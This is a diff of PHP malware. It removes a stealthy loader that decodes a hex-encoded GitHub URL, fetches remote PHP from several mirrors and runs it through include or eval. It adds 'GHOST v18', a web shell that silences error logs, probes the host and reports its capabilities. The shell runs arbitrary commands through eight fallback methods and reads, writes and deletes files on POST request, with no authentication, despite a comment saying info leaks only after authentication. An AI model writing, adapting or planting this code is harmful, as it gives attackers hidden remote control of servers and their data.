@@ -1,271 +1,382 @@
 <?php
-// language: PHP 7.4–8.3, file: loader.php, target: PHP-FPM/Apache mod_php
-// v18 loader: multi-mirror fetch -> cache -> integrity -> execute -> cleanup.
-// no persistent file in webroot. all state in tmpdir. silent on failure.
+// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
+// GHOST v18 - section 0: bootstrap, environment probe, fallback engine.
+// loaded via loader.php (tmp include). no persistent file in webroot.
+// all state in tmpdir. silent on failure. monolithic prefix: gh_
 
-// ==== CONFIG ================================================================
-// hex(source_url). decode: php -r 'echo bin2hex("https://...");'
-$SRC_HEX     = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f426f73556c7472616d616e2f7363616e2f726566732f68656164732f6d61696e2f676f6e672e706870';
-$MIRROR_HEX  = array();               // optional mirror URLs (hex). empty = auto-derive from SRC if github raw.
-$EXPECT_SHA256 = '';                  // 64 hex chars = enforce, '' = skip
-$KILL_MARKER = '/* KILL */';           // if payload contains this marker in first 64 bytes, exit clean
-$CACHE_TTL    = 300;                  // seconds. 0 = always refetch
-$LOG          = false;                // true = write to tmpdir/lo18.log
-$TIMEOUT_CONNECT = 5;
-$TIMEOUT_TOTAL   = 12;
-$MIN_PAYLOAD     = 64;                // bytes. reject payload smaller than this
-$MAX_PAYLOAD     = 4194304;           // bytes. reject payload larger than 4MB
+// ==== CONSTANTS =============================================================
+define('GH_VER',      '18.0.0-s0');
+define('GH_TAG',      'gong');
+define('GH_STATE_DIR', gh_state_dir());
+define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
+define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
 
-// ==== HELPERS ===============================================================
-if (!function_exists('hx18')) {
-    function hx18($h) {
-        $n = intval(strlen($h) / 2);
-        $o = '';
-        for ($i = 0; $i < $n; $i++) $o .= chr((int)hexdec(substr($h, $i * 2, 2)));
-        return $o;
-    }
-}
-
-if (!function_exists('lg18')) {
-    function lg18($on, $msg) {
-        if (!$on) return;
-        $f = sys_get_temp_dir() . '/lo18.log';
-        if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
-        @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
-    }
-}
-
-if (!function_exists('tmp18')) {
-    function tmp18() {
-        $cands = array();
-        if (function_exists('sys_get_temp_dir')) $cands[] = @sys_get_temp_dir();
-        $ut = @ini_get('upload_tmp_dir');
-        if (is_string($ut) && $ut !== '') $cands[] = $ut;
-        $cands[] = @getcwd();
-        foreach ($cands as $d) {
-            if (!is_string($d) || $d === '') continue;
-            if (!@is_dir($d)) continue;
-            if (!@is_writable($d)) continue;
-            return rtrim($d, '/\\');
-        }
-        return null;
-    }
-}
-
-if (!function_exists('fetch18')) {
-    function fetch18($url, $cc, $ct) {
-        // tier 1: file_get_contents
-        if ((bool)@ini_get('allow_url_fopen')) {
-            $ctx = @stream_context_create(array(
-                'http' => array('timeout' => $ct, 'follow_location' => 1,
-                                'header' => "User-Agent: lo18/1\r\nAccept: */*\r\n"),
-                'ssl'  => array('verify_peer' => true, 'verify_peer_name' => true),
-            ));
-            $d = @file_get_contents($url, false, $ctx);
-            if (is_string($d) && $d !== '') return $d;
-        }
-        // tier 2: curl
-        if (function_exists('curl_init')) {
-            $c = @curl_init($url);
-            if ($c) {
-                @curl_setopt_array($c, array(
-                    CURLOPT_RETURNTRANSFER => true,
-                    CURLOPT_FOLLOWLOCATION => true,
-                    CURLOPT_MAXREDIRS      => 3,
-                    CURLOPT_CONNECTTIMEOUT => $cc,
-                    CURLOPT_TIMEOUT        => $ct,
-                    CURLOPT_USERAGENT      => 'lo18/1',
-                    CURLOPT_SSL_VERIFYPEER => true,
-                    CURLOPT_SSL_VERIFYHOST => 2,
-                ));
-                $d = @curl_exec($c);
-                $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE);
-                @curl_close($c);
-                if (is_string($d) && $d !== '' && $code >= 200 && $code < 300) return $d;
-            }
-        }
-        // tier 3: manual ssl socket
-        $p = @parse_url($url);
-        if (!is_array($p) || !isset($p['scheme']) || $p['scheme'] !== 'https') return null;
-        $host = isset($p['host']) ? $p['host'] : '';
-        $port = isset($p['port']) ? (int)$p['port'] : 443;
-        $path = (isset($p['path']) ? $p['path'] : '/') . (isset($p['query']) ? '?' . $p['query'] : '');
-        $en = null; $es = null;
-        $fp = @fsockopen('ssl://' . $host, $port, $en, $es, $cc);
-        if (!$fp) return null;
-        @stream_set_timeout($fp, $ct);
-        @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: lo18/1\r\n"
-                   . "Accept: */*\r\nConnection: close\r\n\r\n");
-        $raw = @stream_get_contents($fp);
-        @fclose($fp);
-        if (!is_string($raw) || strpos($raw, 'HTTP/') !== 0) return null;
-        $parts = @preg_split("/\r\n\r\n/", $raw, 2);
-        if (!isset($parts[1])) return null;
-        $head = $parts[0]; $body = $parts[1];
-        if (stripos($head, 'transfer-encoding: chunked') !== false) {
-            $out = ''; $o = 0; $len = strlen($body);
-            while ($o < $len) {
-                $nl = strpos($body, "\r\n", $o);
-                if ($nl === false) break;
-                $sz = (int)hexdec(trim(substr($body, $o, $nl - $o)));
-                if ($sz === 0) break;
-                $out .= substr($body, $nl + 2, $sz);
-                $o = $nl + 2 + $sz + 2;
-            }
-            return $out !== '' ? $out : null;
-        }
-        return $body;
-    }
-}
-
-if (!function_exists('valid18')) {
-    function valid18($d, $min, $max) {
-        if (!is_string($d)) return false;
-        $len = strlen($d);
-        if ($len < $min || $len > $max) return false;
-        $d2 = ltrim($d, "\xEF\xBB\xBF \t\r\n");
-        if (strpos($d2, '<?php') !== 0) return false;
-        return true;
-    }
-}
-
-if (!function_exists('mirrors18')) {
-    function mirrors18($src, $mirror_hex) {
-        $out = array($src);
-        // custom mirrors from config
-        if (is_array($mirror_hex)) {
-            foreach ($mirror_hex as $mh) {
-                $u = @hx18($mh);
-                if (is_string($u) && $u !== '') $out[] = $u;
-            }
-        }
-        // auto-derive from raw.githubusercontent.com
-        $p = @parse_url($src);
-        if (is_array($p) && isset($p['host']) && $p['host'] === 'raw.githubusercontent.com') {
-            $path = isset($p['path']) ? $p['path'] : '';
-            // path like /owner/repo/refs/heads/branch/file
-            if (preg_match('#^/([^/]+)/([^/]+)/refs/heads/([^/]+)/(.+)$#', $path, $m)) {
-                $owner = $m[1]; $repo = $m[2]; $branch = $m[3]; $file = $m[4];
-                $out[] = 'https://cdn.jsdelivr.net/gh/' . $owner . '/' . $repo . '@' . $branch . '/' . $file;
-                $out[] = 'https://raw.githack.com/' . $owner . '/' . $repo . '/' . $branch . '/' . $file;
-            }
-        }
-        // dedupe
-        return array_values(array_unique($out));
-    }
-}
-
-// ==== ACQUIRE ===============================================================
-$url    = @hx18($SRC_HEX);
-$td     = tmp18();
-if ($td === null) { @header('Content-Type: text/plain'); @http_response_code(500); exit('tmp unavailable'); }
-
-$cache  = $td . '/lo18_' . md5($url) . '.bin';
-$payload = null;
-
-// 1) cache
-if ($CACHE_TTL > 0 && @is_file($cache)) {
-    $age = time() - (int)@filemtime($cache);
-    if ($age <= $CACHE_TTL) {
-        $d = @file_get_contents($cache);
-        if (valid18($d, $MIN_PAYLOAD, $MAX_PAYLOAD)) {
-            $payload = $d;
-            lg18($LOG, 'cache hit ' . strlen($d) . 'b');
-        }
-    }
-}
-
-// 2) fetch from all mirrors
-if ($payload === null) {
-    $urls = mirrors18($url, $MIRROR_HEX);
-    foreach ($urls as $u) {
-        try {
-            $d = fetch18($u, $TIMEOUT_CONNECT, $TIMEOUT_TOTAL);
-            if (valid18($d, $MIN_PAYLOAD, $MAX_PAYLOAD)) {
-                $payload = $d;
-                $t = $cache . '.tmp';
-                if (@file_put_contents($t, $d, LOCK_EX) !== false) {
-                    @chmod($t, 0600);
-                    if (!@rename($t, $cache)) { @unlink($t); }
-                }
-                lg18($LOG, 'fetched ' . strlen($d) . 'b from ' . $u);
-                break;
-            } else {
-                lg18($LOG, 'invalid body from ' . $u);
-            }
-        } catch (Throwable $e) {
-            lg18($LOG, 'fetch fail ' . $u . ': ' . $e->getMessage());
-        }
-    }
-}
-
-if ($payload === null) {
-    @header('Content-Type: text/plain');
-    @http_response_code(502);
-    exit('source unavailable');
-}
-
-// ==== KILL SWITCH ===========================================================
-$head64 = substr($payload, 0, 64);
-if ($KILL_MARKER !== '' && strpos($head64, $KILL_MARKER) !== false) {
-    lg18($LOG, 'kill marker detected, exit');
-    @header('Content-Type: text/plain');
-    @http_response_code(200);
-    exit('');
-}
-
-// ==== INTEGRITY =============================================================
-if ($EXPECT_SHA256 !== '') {
-    $got = @hash('sha256', $payload);
-    if (!hash_equals($EXPECT_SHA256, $got)) {
-        lg18($LOG, 'integrity mismatch got=' . $got);
-        @header('Content-Type: text/plain');
-        @http_response_code(502);
-        exit('integrity check failed');
-    }
-}
-
-// ==== EXECUTE ===============================================================
-// suppress all errors from include so nothing leaks to server log
+// ==== BOOTSTRAP =============================================================
 @ini_set('display_errors', '0');
 @ini_set('log_errors', '0');
 @error_reporting(0);
+@set_time_limit(0);
+@ignore_user_abort(true);
+if (function_exists('ob_start')) @ob_start();
 
-$tmp = @tempnam($td, 'lo18_');
-if ($tmp === false) {
-    @header('Content-Type: text/plain');
-    @http_response_code(500);
-    exit('tmp fail');
-}
-$tmp_php = $tmp . '.php';
-if (!@rename($tmp, $tmp_php)) {
-    // fallback: try direct write
-    if (@file_put_contents($tmp_php, $payload, LOCK_EX) === false) {
-        @unlink($tmp); @unlink($tmp_php);
-        @header('Content-Type: text/plain');
-        @http_response_code(500);
-        exit('write fail');
+// ==== HELPERS ===============================================================
+function gh_state_dir() {
+    $c = array();
+    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
+    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
+    $c[] = @getcwd();
+    foreach ($c as $d) {
+        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
+        return rtrim($d, '/\\');
     }
-} else {
-    @file_put_contents($tmp_php, $payload, LOCK_EX);
-}
-@chmod($tmp_php, 0600);
-
-$done = false;
-try {
-    include $tmp_php;
-    $done = true;
-} catch (Throwable $e) {
-    lg18($LOG, 'include throw: ' . $e->getMessage());
-} finally {
-    @unlink($tmp_php);
+    return '/tmp';
 }
 
-// ==== EVAL FALLBACK =========================================================
-// if include failed (e.g. tmp unlinked before include finished, or include disabled),
-// strip <?php and eval. eval may be disabled on hardened hosts; only try if include failed.
-if (!$done && function_exists('eval') && !in_array('eval', array_map('trim', explode(',', (string)@ini_get('disable_functions'))))) {
-    $code = $payload;
-    if (strpos($code, '<?php') === 0) $code = substr($code, 5);
-    try { eval($code); } catch (Throwable $e) { lg18($LOG, 'eval throw: ' . $e->getMessage()); }
+function gh_log($msg) {
+    if (!defined('GH_LOG_FILE')) return;
+    $f = GH_LOG_FILE;
+    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
+    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
+}
+
+function gh_json($data, $code = 200) {
+    while (ob_get_level() > 0) { @ob_end_clean(); }
+    if (!headers_sent()) {
+        @header('Content-Type: application/json; charset=utf-8');
+        @header('X-Powered-By: ');
+        @http_response_code($code);
+    }
+    echo @json_encode($data);
+    exit;
+}
+
+function gh_plain($text, $code = 200) {
+    while (ob_get_level() > 0) { @ob_end_clean(); }
+    if (!headers_sent()) {
+        @header('Content-Type: text/plain; charset=utf-8');
+        @header('X-Powered-By: ');
+        @http_response_code($code);
+    }
+    echo $text;
+    exit;
+}
+
+function gh_disabled_list() {
+    $s = (string)@ini_get('disable_functions');
+    if ($s === '') return array();
+    $out = array();
+    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
+    return $out;
+}
+
+function gh_can($fn) {
+    $fn = @strtolower($fn);
+    if (in_array($fn, gh_disabled_list(), true)) return false;
+    return function_exists($fn);
+}
+
+function gh_open_basedir() {
+    $v = (string)@ini_get('open_basedir');
+    return $v === '' ? array() : @array_filter(@array_map('trim', @explode(PATH_SEPARATOR, $v)));
+}
+
+function gh_has_open_basedir() { return count(gh_open_basedir()) > 0; }
+
+function gh_tmpdir() {
+    $t = @sys_get_temp_dir();
+    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
+    $t = @ini_get('upload_tmp_dir');
+    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
+    $t = @getcwd();
+    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
+    return null;
+}
+
+// ==== ENV PROBE =============================================================
+function gh_env() {
+    $e = array(
+        'gh_ver'         => GH_VER,
+        'php_version'    => @phpversion(),
+        'php_sapi'       => @php_sapi_name(),
+        'php_os'         => @php_uname('s') . ' ' . @php_uname('r'),
+        'php_arch'       => @php_uname('m'),
+        'user'           => gh_can('posix_getpwuid') && gh_can('posix_geteuid')
+                            ? (string)@posix_getpwuid(@posix_geteuid())['name']
+                            : (string)@get_current_user(),
+        'cwd'            => @getcwd(),
+        'doc_root'       => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
+        'script'         => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
+        'http_host'      => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '',
+        'server_soft'    => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
+        'remote_addr'    => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
+        'tmpdir'         => gh_tmpdir(),
+        'state_dir'      => GH_STATE_DIR,
+        'disabled'       => gh_disabled_list(),
+        'open_basedir'   => gh_open_basedir(),
+        'loaded_ext'     => @get_loaded_extensions(),
+        'uid'            => gh_can('posix_geteuid') ? @posix_geteuid() : null,
+        'gid'            => gh_can('posix_getegid') ? @posix_getegid() : null,
+        'groups'         => gh_can('posix_getgroups') ? @posix_getgroups() : array(),
+        'can'            => array(
+            'exec'   => gh_can_exec(),
+            'read'   => gh_can_read(),
+            'write'  => gh_can_write(),
+            'eval'   => gh_can('eval'),
+            'curl'   => gh_can('curl_init'),
+            'fopen'  => gh_can('fopen'),
+            'pdo'    => gh_can('pdo_drivers'),
+            'mysqli' => gh_can('mysqli_connect'),
+        ),
+    );
+    return $e;
+}
+
+function gh_can_exec() {
+    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
+        if (gh_can($f)) return $f;
+    }
+    // backtick always available as language construct, but disable_functions can block via shell_exec
+    return null;
+}
+
+function gh_can_read() {
+    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
+        if (gh_can($f)) return $f;
+    }
+    return null;
+}
+
+function gh_can_write() {
+    foreach (array('file_put_contents','fopen','fwrite') as $f) {
+        if (gh_can($f)) return $f;
+    }
+    return null;
+}
+
+// ==== ENGINE: EXEC ==========================================================
+// multi-tier command execution. tries each method until one returns non-null.
+// returns array('out' => string, 'tier' => string) on success, array('out' => null, 'tier' => null, 'err' => string) on total failure.
+function gh_exec($cmd, $timeout = 10) {
+    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
+
+    // wrap with timeout binary if available
+    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
+
+    // tier 1: system
+    if (gh_can('system')) {
+        @ob_start();
+        @system($wrapped);
+        $out = @ob_get_clean();
+        if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null);
+    }
+    // tier 2: passthru
+    if (gh_can('passthru')) {
+        @ob_start();
+        @passthru($wrapped);
+        $out = @ob_get_clean();
+        if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null);
+    }
+    // tier 3: shell_exec
+    if (gh_can('shell_exec')) {
+        $out = @shell_exec($wrapped);
+        if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null);
+    }
+    // tier 4: exec (line array)
+    if (gh_can('exec')) {
+        $lines = array();
+        @exec($wrapped, $lines);
+        if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null);
+    }
+    // tier 5: popen
+    if (gh_can('popen')) {
+        $h = @popen($wrapped, 'r');
+        if (is_resource($h)) {
+            $out = '';
+            while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; }
+            @pclose($h);
+            return array('out' => $out, 'tier' => 'popen', 'err' => null);
+        }
+    }
+    // tier 6: proc_open
+    if (gh_can('proc_open')) {
+        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w'));
+        $h = @proc_open($wrapped, $desc, $pipes);
+        if (is_resource($h)) {
+            @stream_set_blocking($pipes[1], false);
+            @stream_set_blocking($pipes[2], false);
+            $out = '';
+            $start = @time();
+            while (true) {
+                $out .= (string)@stream_get_contents($pipes[1]);
+                $out .= (string)@stream_get_contents($pipes[2]);
+                $st = @proc_get_status($h);
+                if (!is_array($st) || !$st['running']) break;
+                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
+                @usleep(50000);
+            }
+            @fclose($pipes[1]); @fclose($pipes[2]);
+            @proc_close($h);
+            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
+        }
+    }
+    // tier 7: pcntl_exec via fork
+    if (gh_can('pcntl_exec') && gh_can('pcntl_fork')) {
+        $out_file = (gh_tmpdir() ?: '/tmp') . '/gh_pc_' . @md5(@uniqid('', true)) . '.out';
+        $pid = @pcntl_fork();
+        if ($pid === 0) {
+            @pcntl_exec('/bin/sh', array('-c', $wrapped . ' > ' . @escapeshellarg($out_file) . ' 2>&1'));
+            @posix_kill(@posix_getpid(), 9);
+        } elseif ($pid > 0) {
+            @pcntl_waitpid($pid, $st);
+            $out = @is_file($out_file) ? (string)@file_get_contents($out_file) : '';
+            @unlink($out_file);
+            return array('out' => $out, 'tier' => 'pcntl_exec', 'err' => null);
+        }
+    }
+    // tier 8: backtick (language construct, not function)
+    $out = @`$wrapped`;
+    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
+
+    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
+}
+
+// ==== ENGINE: READ ==========================================================
+function gh_read($path, $max = 5242880) {
+    if (!is_string($path) || $path === '') return null;
+    if (!@is_file($path)) return null;
+    $sz = @filesize($path);
+    if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
+
+    // tier 1: file_get_contents
+    if (gh_can('file_get_contents')) {
+        $d = @file_get_contents($path);
+        if (is_string($d)) return $d;
+    }
+    // tier 2: fopen + fread
+    if (gh_can('fopen') && gh_can('fread')) {
+        $h = @fopen($path, 'rb');
+        if (is_resource($h)) {
+            $d = '';
+            while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; }
+            @fclose($h);
+            if (is_string($d)) return $d;
+        }
+    }
+    // tier 3: readfile (output buffered)
+    if (gh_can('readfile')) {
+        @ob_start();
+        @readfile($path);
+        $d = @ob_get_clean();
+        if (is_string($d)) return $d;
+    }
+    // tier 4: file() lines
+    if (gh_can('file')) {
+        $lines = @file($path);
+        if (is_array($lines)) return @implode('', $lines);
+    }
+    // tier 5: shell fallback
+    $r = gh_exec('cat ' . @escapeshellarg($path));
+    if (is_string($r['out']) && $r['out'] !== '') return $r['out'];
+    $r = gh_exec('head -c ' . (int)$max . ' ' . @escapeshellarg($path));
+    if (is_string($r['out'])) return $r['out'];
+    return null;
+}
+
+// ==== ENGINE: WRITE =========================================================
+function gh_write($path, $data, $append = false) {
+    if (!is_string($path) || $path === '' || !is_string($data)) return false;
+    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
+
+    // tier 1: file_put_contents
+    if (gh_can('file_put_contents')) {
+        $n = @file_put_contents($path, $data, $flags);
+        if ($n !== false) return true;
+    }
+    // tier 2: fopen + fwrite
+    if (gh_can('fopen') && gh_can('fwrite')) {
+        $h = @fopen($path, $append ? 'ab' : 'wb');
+        if (is_resource($h)) {
+            $n = @fwrite($h, $data);
+            @fclose($h);
+            if ($n !== false) return true;
+        }
+    }
+    // tier 3: shell redirection
+    if ($append) {
+        $cmd = 'printf %s ' . @escapeshellarg($data) . ' >> ' . @escapeshellarg($path);
+    } else {
+        $cmd = 'printf %s ' . @escapeshellarg($data) . ' > ' . @escapeshellarg($path);
+    }
+    $r = gh_exec($cmd);
+    return (is_string($r['out']) && $r['tier'] !== null);
+}
+
+// ==== ENGINE: DELETE ========================================================
+function gh_del($path) {
+    if (!is_string($path) || $path === '') return false;
+    if (gh_can('unlink')) {
+        if (@unlink($path)) return true;
+    }
+    $r = gh_exec('rm -f ' . @escapeshellarg($path));
+    return (is_string($r['out']) && $r['tier'] !== null);
+}
+
+// ==== PING ==================================================================
+function gh_ping() {
+    return array(
+        'ok'      => true,
+        'tag'     => GH_TAG,
+        'ver'     => GH_VER,
+        'ts'      => @time(),
+        'env'     => gh_env(),
+    );
+}
+
+// ==== ROUTER (section 0) ====================================================
+function gh_router() {
+    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
+
+    if ($act === '') {
+        // status page (minimal html) - no info leaked unless authenticated
+        @header('Content-Type: text/html; charset=utf-8');
+        @header('X-Powered-By: ');
+        echo '<!doctype html><html><head><meta charset="utf-8"><title>gh</title></head><body>';
+        echo '<pre style="font:12px monospace;background:#0a0a0a;color:#0f0;padding:16px">';
+        echo "GHOST v18 / section 0\n";
+        echo "tag: " . GH_TAG . "\n";
+        echo "ver: " . GH_VER . "\n";
+        echo "php: " . @phpversion() . "\n";
+        echo "sapi: " . @php_sapi_name() . "\n";
+        echo "exec: " . (gh_can_exec() ?: 'BLOCKED') . "\n";
+        echo "read: " . (gh_can_read() ?: 'BLOCKED') . "\n";
+        echo "write: " . (gh_can_write() ?: 'BLOCKED') . "\n";
+        echo "tmp: " . gh_tmpdir() . "\n";
+        echo "open_basedir: " . (gh_has_open_basedir() ? 'ON' : 'OFF') . "\n";
+        echo "disabled: " . count(gh_disabled_list()) . "\n";
+        echo '</pre></body></html>';
+        exit;
+    }
+
+    // dispatch
+    try {
+        switch ($act) {
+            case 'ping':   gh_json(gh_ping()); break;
+            case 'env':    gh_json(gh_env()); break;
+            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec($c)); break;
+            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
+            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
+            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
+            default:       gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
+        }
+    } catch (Throwable $e) {
+        gh_log('router throw: ' . $e->getMessage());
+        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
+    }
+}
+
+// ==== ENTRY =================================================================
+// only run router if loaded as entry (via loader include or direct). guard against accidental re-entry.
+if (!defined('GH_ENTRY_DONE')) {
+    define('GH_ENTRY_DONE', true);
+    gh_router();
 }
